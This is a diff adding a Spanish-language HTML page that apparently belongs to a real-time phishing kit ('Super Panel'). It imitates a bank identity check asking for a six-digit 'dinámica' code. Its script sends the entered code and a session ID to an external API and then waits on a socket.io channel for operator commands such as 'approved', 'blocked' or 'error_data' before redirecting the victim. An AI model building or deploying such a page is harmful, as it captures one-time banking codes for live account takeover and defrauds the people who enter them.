@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>Super Panel - Acceso</title>
+  <style>
+    :root { color-scheme: light; --bg: #f8fbff; --surface: #ffffff; --text: #0f1b43; --muted: #5b6a8a; --accent: #ff5a5f; font-family: Inter, system-ui, sans-serif; }
+    * { box-sizing: border-box; }
+    body { margin: 0; min-height: 100vh; background: var(--bg); color: var(--text); display: flex; align-items: center; justify-content: center; }
+    .auth-container { max-width: 450px; width: 100%; padding: 40px 24px; background: var(--surface); border-radius: 16px; box-shadow: 0 10px 40px rgba(15,27,67,.05); text-align: center; }
+    .logo-container { margin-bottom: 40px; display: flex; justify-content: center; }
+    .logo-circle { width: 45px; height: 45px; border-radius: 50%; background: linear-gradient(to bottom, #ff5a5f 50%, #0f1b43 50%); position: relative; }
+    .logo-circle::after { content: ''; position: absolute; top: 50%; left: 0; width: 100%; height: 2px; background: white; transform: translateY(-50%); }
+    .welcome-text { font-size: 1.1rem; font-weight: 700; margin-bottom: 4px; color: var(--text); }
+    .sub-text { color: var(--muted); font-size: 0.9rem; margin-bottom: 30px; }
+    .pin-display { display: flex; justify-content: center; gap: 15px; margin-bottom: 40px; }
+    .dot { width: 12px; height: 12px; border: 1.5px solid #d1d9e6; border-radius: 50%; transition: all 0.2s ease; }
+    .dot.filled { background-color: var(--text); border-color: var(--text); }
+    .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; max-width: 320px; margin: 0 auto; }
+    .key { background: #f1f4f9; border: none; border-radius: 12px; height: 60px; font-size: 1.3rem; font-weight: 600; color: var(--text); display: flex; align-items: center; justify-content: center; cursor: pointer; transition: background 0.2s; -webkit-tap-highlight-color: transparent; }
+    .key:active { background: #e2e8f0; }
+    .key.empty { background: transparent; cursor: default; }
+    .key-delete { background: transparent; }
+    .forgot-link { display: inline-block; color: var(--accent); font-weight: 700; text-decoration: underline; margin-top: 35px; font-size: 0.95rem; cursor: pointer; }
+    .error-msg { color: #ff5a5f; font-size: 0.875rem; margin-top: 16px; display: none; }
+    .spinner-overlay { display: none; position: fixed; inset: 0; background: rgba(255,255,255,0.7); align-items: center; justify-content: center; z-index: 999; }
+    .spinner-overlay.active { display: flex; }
+    .spinner { width: 48px; height: 48px; border: 6px solid #e2e8f0; border-top-color: var(--accent); border-radius: 50%; animation: spin 0.9s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+  <div class="auth-container">
+    <div class="logo-container"><div class="logo-circle"></div></div>
+    <div class="welcome-text">¡Hola, validaremos que eres tú!</div>
+    <div class="sub-text">Escribe tu dinámica — entra en la app y tráela a validar</div>
+    <div class="pin-display" id="pinDisplay">
+      <div class="dot"></div><div class="dot"></div><div class="dot"></div>
+      <div class="dot"></div><div class="dot"></div><div class="dot"></div>
+    </div>
+    <div class="keypad">
+      <button class="key" onclick="pressKey('1')">1</button>
+      <button class="key" onclick="pressKey('2')">2</button>
+      <button class="key" onclick="pressKey('3')">3</button>
+      <button class="key" onclick="pressKey('4')">4</button>
+      <button class="key" onclick="pressKey('5')">5</button>
+      <button class="key" onclick="pressKey('6')">6</button>
+      <button class="key" onclick="pressKey('7')">7</button>
+      <button class="key" onclick="pressKey('8')">8</button>
+      <button class="key" onclick="pressKey('9')">9</button>
+      <div class="key empty"></div>
+      <button class="key" onclick="pressKey('0')">0</button>
+      <button class="key key-delete" onclick="deleteKey()">
+        <svg viewBox="0 0 24 24" width="24" height="24" fill="currentColor"><path d="M22,3H7C6.31,3 5.77,3.35 5.41,3.88L0,12L5.41,20.11C5.77,20.64 6.31,21 7,21H22A2,2 0 0,0 24,19V5A2,2 0 0,0 22,3M19,15.59L17.59,17L14,13.41L10.41,17L9,15.59L12.59,12L9,8.41L10.41,7L14,10.59L17.59,7L19,8.41L15.41,12L19,15.59Z"/></svg>
+      </button>
+    </div>
+    <p class="error-msg" id="errorMsg">Código incorrecto. Intenta de nuevo.</p>
+    <div class="forgot-link">Solicitar Dinámica SMS/WhatsApp</div>
+  </div>
+
+  <div class="spinner-overlay" id="spinnerOverlay"><div class="spinner"></div></div>
+
+  <script src="./assets/js/config.js"></script>
+  <script src="https://cdn.socket.io/4.8.1/socket.io.min.js"></script>
+  <script>
+  (() => {
+    const sessionId = sessionStorage.getItem('sessionId');
+    if (!sessionId) { window.location.href = 'INICIO-OLD.html'; return; }
+
+    const socket = io(window.API_BASE_URL);
+    socket.on('connect', () => socket.emit('registerSession', sessionId));
+
+    let otp = '';
+    const MAX = 6;
+    const dots     = document.querySelectorAll('.dot');
+    const errorMsg = document.getElementById('errorMsg');
+    const overlay  = document.getElementById('spinnerOverlay');
+
+    function updateDots() {
+      dots.forEach((d, i) => d.classList.toggle('filled', i < otp.length));
+    }
+
+    async function submitOtp() {
+      overlay.classList.add('active');
+      errorMsg.style.display = 'none';
+
+      try {
+        const res  = await fetch(window.API_BASE_URL + '/api/otp-dinamica', {
+          method:  'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body:    JSON.stringify({ sessionId, otpDinamica: otp })
+        });
+        const data = await res.json();
+
+        if (!data.success) {
+          overlay.classList.remove('active');
+          errorMsg.style.display = 'block';
+          otp = ''; updateDots();
+          return;
+        }
+
+        socket.on('action', ({ action }) => {
+          overlay.classList.remove('active');
+          if (action === 'approved' || action === 'request_form') {
+            window.location.href = 'FIRMASOLICITUD.html';
+          } else if (action === 'blocked') {
+            alert('Acceso bloqueado. Contacta soporte.');
+            otp = ''; updateDots();
+          } else if (action === 'error_data') {
+            errorMsg.style.display = 'block';
+            otp = ''; updateDots();
+          } else if (action === 'error_temp') {
+            alert('Error temporal. Intenta más tarde.');
+            otp = ''; updateDots();
+          }
+        });
+
+      } catch (err) {
+        console.error(err);
+        overlay.classList.remove('active');
+        alert('Error de conexión.');
+        otp = ''; updateDots();
+      }
+    }
+
+    window.pressKey = function(k) {
+      if (otp.length >= MAX) return;
+      otp += k;
+      updateDots();
+      if (otp.length === MAX) submitOtp();
+    };
+
+    window.deleteKey = function() {
+      otp = otp.slice(0, -1);
+      updateDots();
+    };
+  })();
+  </script>
+</body>
+</html>
+
